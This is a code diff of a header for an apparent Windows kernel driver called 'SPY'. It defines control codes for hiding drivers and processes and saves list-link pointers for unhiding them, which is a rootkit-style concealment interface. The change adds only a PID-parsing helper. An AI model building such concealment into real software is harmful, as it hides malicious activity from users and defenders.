@@ -15,7 +15,7 @@
 #define IOCTL_SPY_DHIDE       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2053, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_SPY_PLIST       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2054, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_SPY_PHIDE       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2055, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_SPY_UPDATE     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2056, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_SPY_UPDATE      CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2056, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
 // ---------------------------------------------------------------
 // Common defines use by client 
@@ -31,7 +31,6 @@ typedef struct _SPY_HIDE_INPUT {
     CHAR g_Name[256];
 } SPY_HIDE_INPUT, * PSPY_HIDE_INPUT;
 
-
 // ---------------------------------------------------------------
 // Global Saves (Future backup use)
 // ---------------------------------------------------------------
@@ -41,3 +40,19 @@ typedef struct _SPY_UNHIDE_SAVE {
     PLIST_ENTRY Flink;
     PLIST_ENTRY Blink;
 } SPY_DRIVER_UNHIDE_SAVE, * PSPY_DRIVER_UNHIDE_SAVE;
+
+// ---------------------------------------------------------------
+// Helper Functions
+// ---------------------------------------------------------------
+// Convert ASCII string in g_Name to ULONG PID
+ULONG ParsePidFromString(const CHAR* str)
+{
+    ULONG pid = 0;
+    if (!str) return 0;
+
+    while (*str >= '0' && *str <= '9') {
+        pid = pid * 10 + (*str - '0');
+        str++;
+    }
+    return pid;
+}
